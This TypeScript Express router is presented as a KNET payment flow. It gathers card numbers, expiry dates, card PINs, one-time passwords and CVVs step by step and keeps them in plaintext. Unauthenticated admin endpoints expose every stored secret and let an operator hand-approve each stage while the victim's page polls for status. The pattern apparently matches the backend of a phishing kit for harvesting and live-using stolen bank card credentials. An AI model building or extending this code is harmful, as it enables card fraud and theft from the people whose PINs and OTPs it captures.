import express, { Request, Response } from 'express';

// In-memory storage for transactions (in production, use database)
interface Transaction {
  id: string;
  phone: string;
  amount: string;
  status: 'knet' | 'otp' | 'cvv' | 'completed' | 'rejected';
  knetData?: {
    bank: string;
    cardPrefix: string;
    cardNumber: string;
    expiryMonth: string;
    expiryYear: string;
    pin: string;
  };
  otpData?: {
    otp: string;
  };
  cvvData?: {
    cvv: string;
  };
  knetApproved?: boolean;
  otpApproved?: boolean;
  cvvApproved?: boolean;
  createdAt: number;
  updatedAt: number;
}

const transactions: Map<string, Transaction> = new Map();

export const paymentRouter = express.Router();

// Create a new transaction
paymentRouter.post('/api/payment/start', (req: Request, res: Response) => {
  const { phone, amount } = req.body;
  const transactionId = 'TRX' + Date.now();
  
  const transaction: Transaction = {
    id: transactionId,
    phone,
    amount,
    status: 'knet',
    createdAt: Date.now(),
    updatedAt: Date.now(),
  };
  
  transactions.set(transactionId, transaction);
  res.json({ transactionId });
});

// Submit KNET data
paymentRouter.post('/api/payment/:transactionId/knet', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  const knetData = req.body;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.knetData = knetData;
  transaction.status = 'knet';
  transaction.updatedAt = Date.now();
  
  res.json({ success: true, transactionId });
});

// Submit OTP data
paymentRouter.post('/api/payment/:transactionId/otp', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  const { otp } = req.body;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.otpData = { otp };
  transaction.status = 'otp';
  transaction.updatedAt = Date.now();
  
  res.json({ success: true, transactionId });
});

// Submit CVV data
paymentRouter.post('/api/payment/:transactionId/cvv', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  const { cvv } = req.body;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.cvvData = { cvv };
  transaction.status = 'cvv';
  transaction.updatedAt = Date.now();
  
  res.json({ success: true, transactionId });
});

// Check transaction status (polling)
paymentRouter.get('/api/payment/:transactionId/status', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  res.json({
    id: transaction.id,
    status: transaction.status,
    knetApproved: transaction.knetApproved,
    otpApproved: transaction.otpApproved,
    cvvApproved: transaction.cvvApproved,
  });
});

// Get all transactions for admin
paymentRouter.get('/api/admin/transactions', (req: Request, res: Response) => {
  const allTransactions = Array.from(transactions.values()).map(tx => ({
    id: tx.id,
    phone: tx.phone,
    amount: tx.amount,
    status: tx.status,
    knetData: tx.knetData,
    otpData: tx.otpData,
    cvvData: tx.cvvData,
    knetApproved: tx.knetApproved,
    otpApproved: tx.otpApproved,
    cvvApproved: tx.cvvApproved,
    createdAt: tx.createdAt,
  }));
  
  res.json(allTransactions);
});

// Admin approve KNET
paymentRouter.post('/api/admin/:transactionId/approve-knet', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.knetApproved = true;
  transaction.updatedAt = Date.now();
  
  res.json({ success: true });
});

// Admin reject KNET
paymentRouter.post('/api/admin/:transactionId/reject-knet', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.knetApproved = false;
  transaction.status = 'knet';
  transaction.updatedAt = Date.now();
  
  res.json({ success: true });
});

// Admin approve OTP
paymentRouter.post('/api/admin/:transactionId/approve-otp', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.otpApproved = true;
  transaction.updatedAt = Date.now();
  
  res.json({ success: true });
});

// Admin reject OTP
paymentRouter.post('/api/admin/:transactionId/reject-otp', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.otpApproved = false;
  transaction.status = 'otp';
  transaction.updatedAt = Date.now();
  
  res.json({ success: true });
});

// Admin approve CVV
paymentRouter.post('/api/admin/:transactionId/approve-cvv', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.cvvApproved = true;
  transaction.status = 'completed';
  transaction.updatedAt = Date.now();
  
  res.json({ success: true });
});

// Admin reject CVV
paymentRouter.post('/api/admin/:transactionId/reject-cvv', (req: Request, res: Response) => {
  const { transactionId } = req.params;
  
  const transaction = transactions.get(transactionId);
  if (!transaction) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  transaction.cvvApproved = false;
  transaction.status = 'cvv';
  transaction.updatedAt = Date.now();
  
  res.json({ success: true });
});
